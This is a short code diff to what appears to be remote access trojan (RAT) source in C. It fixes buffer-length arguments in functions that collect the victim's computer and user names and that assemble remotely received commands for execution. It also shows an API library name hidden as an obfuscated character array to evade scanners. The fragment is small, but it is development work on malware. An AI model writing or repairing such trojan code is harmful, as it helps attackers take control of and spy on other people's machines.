@@ -63,7 +63,7 @@ FetchInfo(RATSocket* ratSocket)
 		OutputDebugStringA(bufferError);
 #endif
 
-		strncpy_s(bufferComputer, ca_unknown, sizeof(ca_unknown));
+		strncpy_s(bufferComputer, ca_unknown, strlen(ca_unknown));
 	}
 
 	char ca_advapi32[] = { 'A','d','v','a','p','i','3','2','.','d','l','l',0 };
@@ -86,7 +86,7 @@ FetchInfo(RATSocket* ratSocket)
 		OutputDebugStringA(bufferError);
 #endif		
 
-		strncpy_s(bufferUser, ca_unknown, sizeof(ca_unknown));
+		strncpy_s(bufferUser, ca_unknown, strlen(ca_unknown));
 	}
 
 	char bufferInfo[SOCKET_BUFFER_SIZE];
@@ -278,7 +278,7 @@ ReceiveCmdCommand(RATSocket* ratSocket,
 	int commandIndex = 1;
 	while ( splittedCommand[commandIndex] != NULL )
 	{
-		strncat_s(commandToRun, splittedCommand[commandIndex], sizeof(splittedCommand[commandIndex]));
+		strncat_s(commandToRun, splittedCommand[commandIndex], strlen(splittedCommand[commandIndex]));
 		strncat_s(commandToRun, " ", 1);
 		commandIndex++;
 	}
